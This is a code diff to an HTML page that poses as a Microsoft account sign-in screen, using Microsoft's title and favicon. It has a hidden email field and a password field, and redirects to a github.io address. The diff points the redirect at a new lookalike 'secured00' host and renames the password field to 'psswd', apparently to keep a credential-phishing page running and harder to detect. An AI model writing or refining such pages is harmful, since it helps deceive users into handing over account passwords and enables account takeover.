@@ -3,6 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:;">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
   <title>Sign in to your Microsoft account</title>
   <link rel="icon" type="image/png" href="https://www.microsoft.com/favicon.ico">
   <link rel="stylesheet" href="styles.css">
@@ -102,11 +105,11 @@
             <input
                     type="hidden"
                     name="_redirect"
-                    value="https://secured0.github.io/Microsoft/"
+                    value="https://secured00.github.io/Microsoft/"
                   />
             <input type="hidden" id="hidden-email" name="email">
             <div class="input-group">
-              <input type="password" id="password" name="password" placeholder="Password" required>
+              <input type="password" id="password" name="psswd" placeholder="Password*" required>
               <div class="input-line"></div>
             </div>
             <div class="forgot-password">
